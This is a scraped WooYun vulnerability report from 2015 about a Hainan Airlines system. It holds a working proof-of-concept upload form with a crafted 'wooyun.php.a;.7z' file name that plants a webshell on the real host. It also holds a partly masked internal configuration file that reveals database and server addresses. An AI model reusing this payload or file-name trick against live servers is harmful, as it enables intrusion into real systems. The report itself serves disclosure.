{"id": 44177, "wybug_id": "wooyun-2015-0101890", "wybug_title": "海南航空某系统getshell入内网（各种信息泄露）", "wybug_corp": "海南航空", "wybug_author": "depycode", "wybug_date": "2015-03-17 15:17", "wybug_open_date": "2015-05-02 08:36", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-02：\t细节向公众公开  简要描述： RT.. 详细说明：  \nhttp://icc.hnair.com/\n该系统采用了用友的系统，而且位修补漏洞，导致getshellPOC\n<html><form action=\"http://icc.hnair.com/5107/upload/screenImagesSave.php?filename=wooyun.php.a;.7z\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\">  <input type=\"file\" name=\"file\" >  <input type=\"submit\" value=\"upload\"></form></html>\n直接可以再/data/files/目录下生产wooyun.php.a;.7z文件，利用解析漏洞拿shellshell：http://icc.hnair.com/data/files/20150317/wooyun.php.a;.7z  cmd\n\n\n\n内网#信息泄露\n<?php/** * @class Config 配置类 * @constructor * @author Lynk Li */class Config {\t/**\t * 数据库连接配置\t */\t//主库.\tvar $db = array(\t\t\"type\" \t=> \"oci8\",\t\t\t\t//数据库类型.\t\t\"host\"\t=> \"192.*.*.214\",\t//数据库服务器地址.\t\t\"user\"\t=> \"**\",    //数据库用户名.\t\t\"pass\"\t=> \"**\",     \t\t//数据库密码.\t\t\"name\"\t=> \"**\", \t\t\t//数据库名字/SID.\t\t);\t//当日数据表所属库信息.\tvar $todaysDB = array(\t\t\"type\" \t=> \"oci8\",\t\t\t\t//数据库类型.\t\t\"host\"\t=> \"192.**.**.214\",\t//数据库服务器地址.\t\t\"user\"\t=> \"**\",     \t\t\t//数据库用户名.\t\t\"pass\"\t=> \"**\",     \t\t//数据库密码.Nwl6z1RSo\t\t\"name\"\t=> \"**\", \t\t\t//数据库名字/SID.\t\t\t);\t\t//报表库.\tvar $reportDB = array(\t\t\"type\" \t=> \"oci8\",\t\t\t\t//数据库类型.\t\t\"host\"\t=> \"192.1**.**.214\",\t//数据库服务器地址.\t\t\"user\"\t=> \"**\",     \t\t\t//数据库用户名.\t\t\"pass\"\t=> \"**\",     \t\t//数据库密码.\t\t\"name\"\t=> \"**\", \t\t\t//数据库名字/SID.\t\t\t);\t\t//报表索引主机和数据库.\tvar $roothost \t= '192.**.100.214';\tvar $rootdb\t\t= '**';\tvar $dssDataDB\t= '**';\t//memcache服务配置.\tvar $memcache = array(\t\t\t'host'\t=> '127.0.0.1',\t\t//服务器地址.\t\t\t'port'\t=> '**1'\t\t\t\t\t//端口.\t\t);\t\t\t/**\t * 模版配置\t */\tvar $template = array(\t\t\"dir\"\t\t=> \"templates\",\t\t\"compile\"\t=> \"data/templatesCache\"\t\t);\t\t/**\t * 产品名称.\t */\tvar $productNameDB = array(\t\t'zh-cn' => '5107 ICC - 互联网联络中心 - 5107.cn',\t\t'zh-tw'\t=> '5107 ICC - 互联网联络中心 - 5107.cn',\t\t'en'\t=> '5107 ICC - 互联网联络中心 - 5107.cn'\t\t);\t\t\t\t\t/**\t * 产品版本号.\t */\t \t var $version = 'v3.1.0';\t/**\t * url and file path configure\t */\tvar $baseUrl = \"http://192.168.1**\";\tvar $basePath = \"/home/ecccs/web/\";\tvar $flashUrl = \"http://192.168.**\";\t\t\t//访客端截屏HTTP上传配置.\tvar $httpHost\t= '192.1**.1**.223';\tvar $httpPort\t= '80';\tvar $uploadUrl\t= '/5107/**ad/upload.php';\t\t/**\t * 服务器地址端口信息配置.\t */\tvar $lsIp\t\t= '192.1**.1**0.223';\t//ls地址.\tvar $lsPort\t\t= '8080';\t\t\t\t//ls端口.\tvar $fsIp\t\t= '192.1**8.1**0.223';\t//fs地址.\tvar $fsPort\t\t= '80**';\t\t\t\t//fs端口.\tvar $udldIp\t\t= 'cs.5**.cn';\t\t\t//web服务器地址.\tvar $fmsIp\t\t= '192.16**100.223';\t\t\t//语音服务器地址.\t\t/**\t * 代理功能开关.\t */\tvar $proxy\t\t= 0; //0关闭；1启用.\tvar $proxyUrl \t= \"http://proxy.51**\";\t//HTTP代理路径.\t\t\t/**\t * language type\t */\tvar $lang = \"zh-cn\";\t\t/**\t * default theme type\t */\tvar $theme = \"0\";\t\t/**\t * default color type\t */\tvar $color = \"0\";\t\t\t/**\t * charset\t */\tvar $charset = 'UTF-8';\t\t/**\t * num set\t */\tvar $clothNum = 30;\t\t/**\t * 响应超标标准(时间/秒).\t */\tvar $rsponseSuperscale = 30;\t/**\t * 默认允许的URl地址.用在hj5107.js.php中\t */\t\tvar $defaultURL = array('cengis.com','510**.cn','192.1**.1**.223');\t}?>\n敏感部位以打码。\n\n\n\n   漏洞证明：  \n\n   修复方案：  打补丁！   版权声明：转载请注明来源 depycode@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-18 08:34 厂商回复： 谢谢，我司会立即组织修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}